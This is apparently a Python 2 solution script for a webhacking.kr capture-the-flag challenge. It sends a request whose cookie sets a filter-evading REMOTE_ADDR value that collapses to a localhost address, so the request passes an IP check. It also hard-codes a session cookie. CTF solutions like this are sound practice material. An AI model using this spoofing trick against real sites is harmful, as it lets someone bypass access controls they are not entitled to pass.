import requests

url = "http://webhacking.kr/challenge/bonus/bonus-4/index.php"

headers = {
	"Cookie":"PHPSESSID=ce7d7b3317819f9f01951a6263279e37;REMOTE_ADDR=112277..00..00..1",
	"Host":"webhacking.kr"
}


req = requests.get(url,headers=headers)
print req.content



